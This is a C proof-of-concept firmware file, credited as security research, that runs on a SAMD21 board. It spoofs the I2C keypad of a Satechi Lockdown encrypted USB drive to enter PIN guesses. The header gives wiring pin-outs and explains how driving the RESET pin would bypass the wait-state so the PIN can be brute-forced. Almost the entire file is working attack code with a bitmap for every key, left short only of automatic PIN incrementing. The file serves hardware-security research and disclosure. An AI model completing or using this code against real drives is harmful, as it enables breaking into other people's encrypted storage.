/*
    Security research by Colin O'Flynn.

	This is a basic PoC for spoofing the Keyboard on a a Satechi Lockdown USB 3.0 AES-256 Protected device, where
	the PCB is marked:
	
	   20111020 Ver A3.
	   SKY Digital Inc.

	This isn't a complete attack script, as it doesn't auto-increment the password guess. Using this requires you to have
	an Atmel SAMD21 Xplained board. Connect PB08 to SDA on the Lockdown main board, and PA09 to SCL.
		
	See following ascii-art for pin definitions, looking at main PCB:
		
	    +---------------------------------------------+
	    |               |USB CONN|             1  2   |
	    |                                      3  4   |
	+---+                                      5  6   +---+
	|                                                     |
	+-----------------------------------------------------+
	          | SATA CONNECTOR HERE |
			
    2 = GND 
	5 = SDA
	6 = SCL

    This script waits for the drive to boot, and once it sees the polling start it will pretend to enter
	a specific PIN code. To complete the attack you would need this code to simply drive the RESET pin on the device, and
	increment the PIN guess.
	
	Using the RESET pin bypasses the wait-state that otherwise makes it too slow to brute-force.
	
	There's no output, as this assumes you are running the code in a debugger to view the status.
*/

#include <asf.h>

void configure_i2c_slave(void);

//! [address]
#define SLAVE_ADDRESS 0x2C
//! [address]

//! [packet_data]
#define DATA_LENGTH 2

uint8_t write_buffer[DATA_LENGTH] = {
	0x00, 0x00
};
uint8_t read_buffer[DATA_LENGTH];
//! [packet_data]

//! [module]
struct i2c_slave_module i2c_slave_instance;
//! [module]

//! [initialize_i2c]
void configure_i2c_slave(void)
{
	/* Create and initialize config_i2c_slave structure */
	//! [init_conf]
	struct i2c_slave_config config_i2c_slave;
	i2c_slave_get_config_defaults(&config_i2c_slave);
	//! [init_conf]

	/* Change address and address_mode */
	//! [conf_changes]
	config_i2c_slave.address        = SLAVE_ADDRESS;
	config_i2c_slave.address_mask   = 0;
	config_i2c_slave.address_mode   = I2C_SLAVE_ADDRESS_MODE_MASK;
	config_i2c_slave.buffer_timeout = 1000;
	//! [conf_changes]

	/* Initialize and enable device with config_i2c_slave */
	//! [init_module]
	i2c_slave_init(&i2c_slave_instance, CONF_I2C_SLAVE_MODULE, &config_i2c_slave);
	//! [init_module]

	//! [enable_module]
	i2c_slave_enable(&i2c_slave_instance);
	//! [enable_module]
}
//! [initialize_i2c]

int main(void)
{
	system_init();
	
	unsigned int pollcnt = 1;

	configure_i2c_slave();
	enum i2c_slave_direction dir;
	struct i2c_slave_packet packet = {
		.data_length = DATA_LENGTH,
		.data        = write_buffer,
	};
	
	unsigned int passwdlen = 5; //5 including enter button
	unsigned int curdig = 0;
	unsigned int digstat = 0;
	unsigned int tick = 2; //Tick defines delay between sending buttons
	uint8_t passwdcheck[10] = {1,2,3,5,20}; /* 20 is enter button */
	uint8_t complete_buffer[2] = {0,0};
	
	
	while (true) {
		/* Wait for direction from master */		
		dir = i2c_slave_get_direction_wait(&i2c_slave_instance);

		/* Transfer packet in direction requested by master */
		if (dir == I2C_SLAVE_DIRECTION_READ) {
			packet.data = read_buffer;
			i2c_slave_read_packet_wait(&i2c_slave_instance, &packet);
		} else if (dir == I2C_SLAVE_DIRECTION_WRITE) {
			/* We just wait for a read of required data */
			if(pollcnt > 0){
				if (read_buffer[1] == 0x45){
					pollcnt++;
				}
			}
			
			if ((digstat == 0) || (digstat == 3)){
				if (pollcnt == tick) {
					tick += 4;
					if (digstat == 0){
						digstat = 1; //Send status
					} else {
						digstat = 0;
						complete_buffer[0] = 0;
						complete_buffer[1] = 0;
					}					
				}
			}
					
			if (digstat == 1){
				switch(passwdcheck[curdig]){
					/* This maps a button number to the required
					   bit maps in the data sent over I2C. This was
					   found by experimentation. */
					case 0:
					    complete_buffer[0] = 0;
						complete_buffer[1] = 0x02;
						digstat = 2;
						break;	
						
					case 1:
						complete_buffer[0] = 0;
						complete_buffer[1] = 0x01;
						digstat = 2;
						break;
					
					case 2:
						complete_buffer[0] = 0x80;
						complete_buffer[1] = 0;
						digstat = 2;
						break;
					
					case 3:
						complete_buffer[0] = 0x20;
						complete_buffer[1] = 0;
						digstat = 2;
						break;
					
					case 4:
						complete_buffer[0] = 0;
						complete_buffer[1] = 0x04;
						digstat = 2;
						break;
						
					case 5:
						complete_buffer[0] = 0x01;
						complete_buffer[1] = 0;
						digstat = 2;
						break;
						
					case 6:
						complete_buffer[0] = 0x10;
						complete_buffer[1] = 0;
						digstat = 2;
						break;
						
					case 7:
						complete_buffer[0] = 0x00;
						complete_buffer[1] = 0x08;
						digstat = 2;
						break;
						
					case 8:
						complete_buffer[0] = 0x02;
						complete_buffer[1] = 0;
						digstat = 2;
						break;
						
					case 9:
						complete_buffer[0] = 0x08;
						complete_buffer[1] = 0;
						digstat = 2;
						break;
					
					case 20:
						complete_buffer[0] = 0x40;
						complete_buffer[1] = 0;
						digstat = 2;
						break;
					
					default:
						digstat = 0;
						complete_buffer[0] = 0;
						complete_buffer[1] = 0;
						break;										
				}
			}
			
			if (digstat == 2){
				digstat = 3;
				curdig++;
			}
			
			if (curdig > passwdlen){
				pollcnt = 0;
			}
			
			if (read_buffer[1] == 0x45){
				write_buffer[1] = complete_buffer[0];
			}
			
			if (read_buffer[1] == 0x46){
				write_buffer[1] = complete_buffer[1];
			}
			
			packet.data = write_buffer;
			i2c_slave_write_packet_wait(&i2c_slave_instance, &packet);
		
			/*
			if (pollcnt == 20){
				write_buffer[0] = 0x01;				
			}
			
			if (pollcnt == 25){
				write_buffer[0] = 0x00;
			}
			
			if (pollcnt == 30){
				write_buffer[0] = 0x02;
			}
			
			if (pollcnt == 35){
				write_buffer[0] = 0x00;
			}
			
			if (pollcnt == 40){
				write_buffer[0] = 0x08;
			}
			
			if (pollcnt == 45){
				write_buffer[0] = 0x00;
			}
			
			if (pollcnt == 50){
				write_buffer[0] = 0x10;
			}
			
			if (pollcnt == 55){
				write_buffer[0] = 0x00;
			}
			
			if (pollcnt == 60){
				write_buffer[1] = 0x40;
			}
			
			if (pollcnt == 65){
				write_buffer[1] = 0x00;
				pollcnt = 0;
			}*/
			
			read_buffer[1] = 0;
			
		}
		//! [transfer]
	}
	//! [while]
}
